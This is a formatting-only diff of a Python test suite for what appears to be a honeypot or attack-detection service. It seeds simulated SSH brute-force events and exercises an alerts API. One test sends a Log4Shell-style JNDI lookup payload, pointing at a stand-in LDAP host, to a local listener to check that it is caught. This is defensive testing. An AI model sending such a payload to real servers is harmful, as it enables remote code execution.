@@ -93,6 +93,7 @@ async def _telnet_iot_flow(engine):
 
     # The writer thread batches; give it a beat, then read back.
     from sqlalchemy import select
+
     from storage.db import session_scope
 
     with session_scope() as db:
@@ -132,7 +133,9 @@ async def _http_log4shell_flow(engine):
     payload = "/?x=${jndi:ldap://198.18.0.9:1389/a}"
     try:
         reader, writer = await asyncio.open_connection("127.0.0.1", port)
-        request = f"GET {payload} HTTP/1.1\r\nHost: t\r\nUser-Agent: curl/8\r\nConnection: close\r\n\r\n"
+        request = (
+            f"GET {payload} HTTP/1.1\r\nHost: t\r\nUser-Agent: curl/8\r\nConnection: close\r\n\r\n"
+        )
         writer.write(request.encode())
         await writer.drain()
         await reader.read(4096)
@@ -144,6 +147,7 @@ async def _http_log4shell_flow(engine):
         logger.stop()
 
     from sqlalchemy import select
+
     from storage.db import session_scope
 
     with session_scope() as db:
@@ -172,29 +176,70 @@ def seeded_db(engine):
 
     # An SSH brute-force burst: 30 attempts in ~5 minutes from one source.
     sid = str(uuid.uuid4())
-    sessions.append(SessionRow(session_id=sid, sensor="t", service="ssh",
-                               src_ip="192.0.2.100", src_port=1234, dst_port=22, started_at=base))
+    sessions.append(
+        SessionRow(
+            session_id=sid,
+            sensor="t",
+            service="ssh",
+            src_ip="192.0.2.100",
+            src_port=1234,
+            dst_port=22,
+            started_at=base,
+        )
+    )
     for i in range(30):
-        events.append(Event(
-            event_id=str(uuid.uuid4()), ts=base + dt.timedelta(seconds=i * 8),
-            sensor="t", session_id=sid, service="ssh",
-            event_type=EventType.AUTH_ATTEMPT.value, severity=Severity.MEDIUM.value,
-            src_ip="192.0.2.100", dst_port=22,
-            username=f"user{i % 5}", password="123456",
-            country="CN", country_name="China", latitude=31.2, longitude=121.4,
-            asn=64512, as_org="Demo", threat_score=5.0, tags=["ssh-password"],
-        ))
+        events.append(
+            Event(
+                event_id=str(uuid.uuid4()),
+                ts=base + dt.timedelta(seconds=i * 8),
+                sensor="t",
+                session_id=sid,
+                service="ssh",
+                event_type=EventType.AUTH_ATTEMPT.value,
+                severity=Severity.MEDIUM.value,
+                src_ip="192.0.2.100",
+                dst_port=22,
+                username=f"user{i % 5}",
+                password="123456",
+                country="CN",
+                country_name="China",
+                latitude=31.2,
+                longitude=121.4,
+                asn=64512,
+                as_org="Demo",
+                threat_score=5.0,
+                tags=["ssh-password"],
+            )
+        )
 
     # A benign single connect from another source.
     sid2 = str(uuid.uuid4())
-    sessions.append(SessionRow(session_id=sid2, sensor="t", service="http",
-                               src_ip="198.51.100.5", dst_port=80, started_at=base))
-    events.append(Event(
-        event_id=str(uuid.uuid4()), ts=base, sensor="t", session_id=sid2,
-        service="http", event_type=EventType.CONNECT.value, severity=Severity.INFO.value,
-        src_ip="198.51.100.5", dst_port=80, country="US", country_name="United States",
-        tags=[],
-    ))
+    sessions.append(
+        SessionRow(
+            session_id=sid2,
+            sensor="t",
+            service="http",
+            src_ip="198.51.100.5",
+            dst_port=80,
+            started_at=base,
+        )
+    )
+    events.append(
+        Event(
+            event_id=str(uuid.uuid4()),
+            ts=base,
+            sensor="t",
+            session_id=sid2,
+            service="http",
+            event_type=EventType.CONNECT.value,
+            severity=Severity.INFO.value,
+            src_ip="198.51.100.5",
+            dst_port=80,
+            country="US",
+            country_name="United States",
+            tags=[],
+        )
+    )
 
     with session_scope() as db:
         db.add_all(sessions)
@@ -274,7 +319,9 @@ class TestAPI:
         alerts = client.get("/api/alerts?since_hours=48").json()["items"]
         alert_id = alerts[0]["alert_id"]
 
-        patched = client.patch(f"/api/alerts/{alert_id}", json={"status": "acknowledged", "notes": "triaged"})
+        patched = client.patch(
+            f"/api/alerts/{alert_id}", json={"status": "acknowledged", "notes": "triaged"}
+        )
         assert patched.status_code == 200
         assert patched.json()["status"] == "acknowledged"
         assert patched.json()["notes"] == "triaged"
